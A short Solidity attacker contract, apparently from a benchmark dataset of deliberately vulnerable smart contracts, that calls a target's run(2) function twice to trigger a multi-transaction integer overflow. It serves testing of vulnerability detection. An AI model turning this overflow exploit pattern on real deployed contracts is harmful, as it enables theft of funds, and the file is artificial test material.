pragma solidity ^0.8.0;

import "../dataset/arithmetic/integer_overflow_multitx_onefunc_feasible.sol";

contract IntegerOverflowMultiTxOneFuncFeasibleAttacker {
    IntegerOverflowMultiTxOneFuncFeasible public target;

    constructor (address _targetAddress) {
        target = IntegerOverflowMultiTxOneFuncFeasible(_targetAddress);
    }

    function attack() public {
        target.run(2);

        target.run(2);
    }
}